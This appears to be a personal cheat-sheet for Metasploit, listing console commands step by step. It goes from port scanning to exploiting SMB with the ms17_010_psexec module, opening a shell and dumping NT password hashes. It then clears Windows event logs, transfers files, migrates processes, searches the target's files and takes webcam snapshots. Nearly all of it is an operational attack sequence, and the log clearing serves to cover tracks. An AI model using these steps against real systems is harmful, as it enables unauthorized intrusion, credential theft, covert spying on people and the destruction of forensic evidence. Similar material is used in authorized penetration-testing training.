Start Metasploit
```
msfconsole
```

Search for port scan modules

```
search portscan
```

To use a module
Example:
```
use auxiliary/scanner/portscan/syn
```

Show available variables you need to set:
```
show options
```

Set the variables:
```
set rhost <targetIPAddress>
```

Run the payload:
```
run
```

Run nmap from the msfconsole:
```
use auxiliary/ #double tab to see all options
```

```
use exploit/windows/smb/ms17_010_psexec
show options
set RHOSTS <targetIP>
run
shell # to open the targetserver shell
hashdump # dump the NT hashes from the target PC
```

Example output:

![[Pasted image 20260420062708.png]]

Clearing Event records on Windows:
```
clearev
```

Example:
![[Pasted image 20260420062827.png]]

You can also upload and download files by using the "upload" and "download" commands

```
download /root/Desktop/........
```

Migrate to another process:

![[Pasted image 20260420063033.png]]

Search for files:
```
search -f mona-master.zip
```

Example output:

![[Pasted image 20260420063110.png]]

Take a web_cam image using teh target's webcam:
```
webcam_snap
```

